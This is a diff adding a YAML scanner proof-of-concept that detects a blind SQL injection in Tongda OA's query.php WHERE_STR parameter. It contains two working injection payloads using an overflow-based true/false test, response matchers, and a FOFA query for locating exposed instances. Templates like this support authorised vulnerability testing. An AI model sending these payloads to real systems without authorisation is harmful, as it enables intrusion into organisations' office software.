@@ -1,0 +1,25 @@
+id: poc-yaml-tongda-oa-query-where-str-sqli
+info:
+  name: 通达OA /query.php WHERE_STR SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: POST
+  path: /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: WHERE_STR=-@`'` AND if((select%20length((select%20123))=3),1,2*1e308)
+  expression: "status_code == 200 && \nbody == \"\"\n"
+- method: POST
+  path: /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: WHERE_STR=-@`'` AND if((select%20length((select%20123))=1),1,2*1e308)
+  expression: "status_code == 200 && \n(\n  contains(gbk_decode(body),\"错误，请联系管理员\"\
+    ) || contains(body,\"错误，请联系管理员\")\n) &&\ncontains(gbk_decode(body),\"USER_PRIV=USER_PRIV.USER_PRIV\"\
+    )\n"
+variables: {}
+transport: http
